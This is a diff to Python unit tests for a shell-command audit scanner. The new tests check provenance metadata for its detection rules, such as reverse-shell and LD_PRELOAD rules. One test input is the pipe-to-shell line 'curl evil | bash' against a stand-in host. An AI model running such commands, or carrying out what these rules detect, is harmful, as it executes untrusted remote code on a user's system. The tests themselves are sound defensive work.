@@ -237,6 +237,50 @@ class CompetitiveResearchRuleTest(unittest.TestCase):
         self.assertNotIn('ld_preload', rules_for('export LD_LIBRARY_PATH=/usr/lib'))
 
 
+class RuleMetadataTest(unittest.TestCase):
+    """Provenance side map (docs/plans/2026-06-16-audit-rule-maintenance.md, step a)."""
+
+    def _rule_ids(self):
+        return {rule_id for rule_id, *_ in audit._RULES}
+
+    def test_every_meta_key_is_a_real_rule(self):
+        rule_ids = self._rule_ids()
+        for key in audit._RULE_META:
+            self.assertIn(key, rule_ids, f'_RULE_META references unknown rule {key!r}')
+
+    def test_every_campaign_rule_has_a_source(self):
+        for rule_id, meta in audit._RULE_META.items():
+            if meta['kind'] == audit.CAMPAIGN:
+                self.assertTrue(meta.get('source'), f'campaign rule {rule_id!r} must record a source')
+
+    def test_meta_kinds_are_valid(self):
+        for rule_id, meta in audit._RULE_META.items():
+            self.assertIn(meta['kind'], (audit.EVERGREEN, audit.CAMPAIGN), rule_id)
+
+    def test_accessor_defaults_for_baseline_rules(self):
+        # An original hand-written rule (not in the side map) is the evergreen/no-source baseline.
+        self.assertNotIn('eval', audit._RULE_META)
+        meta = audit.rule_metadata('eval')
+        self.assertEqual(meta, {'kind': audit.EVERGREEN, 'added': None, 'source': None})
+
+    def test_accessor_returns_recorded_provenance(self):
+        meta = audit.rule_metadata('npm_install_unknown')
+        self.assertEqual(meta['kind'], audit.CAMPAIGN)
+        self.assertTrue(meta['added'] and meta['source'])
+        derived = audit.rule_metadata('reverse_shell_bash')
+        self.assertEqual(derived['kind'], audit.EVERGREEN)
+        self.assertEqual(derived['added'], '2026-06-16')
+        self.assertTrue(derived['source'])
+
+    def test_counts_add_up(self):
+        # 2 campaign rules, 17 evergreen rules derived from ks-aur-scanner.
+        campaign = [r for r, m in audit._RULE_META.items() if m['kind'] == audit.CAMPAIGN]
+        evergreen_recorded = [r for r, m in audit._RULE_META.items() if m['kind'] == audit.EVERGREEN]
+        self.assertEqual(len(campaign), 2)
+        self.assertEqual(len(evergreen_recorded), 17)
+        self.assertEqual(len(audit._RULE_META), 19)
+
+
 class ScanMechanicsTest(unittest.TestCase):
     def test_comment_lines_are_skipped(self):
         self.assertEqual([], audit.scan('# you should never do: curl evil | bash'))
